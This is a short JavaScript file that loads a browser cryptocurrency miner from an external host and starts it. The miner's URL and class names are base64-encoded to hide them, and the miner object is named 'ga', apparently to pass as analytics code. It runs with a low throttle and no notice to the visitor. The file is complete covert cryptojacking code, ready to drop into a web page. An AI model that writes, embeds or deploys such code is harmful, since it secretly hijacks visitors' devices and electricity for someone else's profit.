function loadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    script.onreadystatechange = callback;
    script.onload = callback;
    head.appendChild(script);
}
var key = document.currentScript.getAttribute('data-key');
var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==")
var afterFunction = function() {
	var ga = new window[atob("Q29pbkhpdmU=")][atob("QW5vbnltb3Vz")](key);
	ga.setThrottle(0.83);
	ga.start();
};
loadScript(script, afterFunction);
